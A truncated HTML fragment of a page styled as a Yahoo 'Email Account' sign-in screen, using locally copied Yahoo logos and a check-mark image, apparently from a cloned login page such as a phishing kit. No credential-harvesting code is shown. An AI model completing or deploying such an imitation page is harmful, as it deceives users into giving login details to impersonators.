   ...
   <body class="orko en-us">
      ...
      <div class="login-body">
         <div class="login-content">
            <div class="login-box ">
               <div class="login-logo"><img src="resources/yahoo_en-us_f_p_bestfit_2x.png" alt="Yahoo" class="logo" width="116" height=""></div>
               <form class="username-challenge" name="Form">
                  <div class="sign-in-title">
                     <h1 class="sign-in-title-greeting" id="mbr-login-greeting">
                        Email Account
                     </h1>
                  </div>
                  <div style="margin-top:50px;" id="username-country-code-field" class="username-country-code cci-dropdown-disabled code-of-length-1">
                    <div class="login-logo">
                      <img src="resources/blue_tick.png" alt="Yahoo" class="logo" width="80" height="">
                    </div>
                     <p class="row" style="margin-top:50px;font-size:14px;">
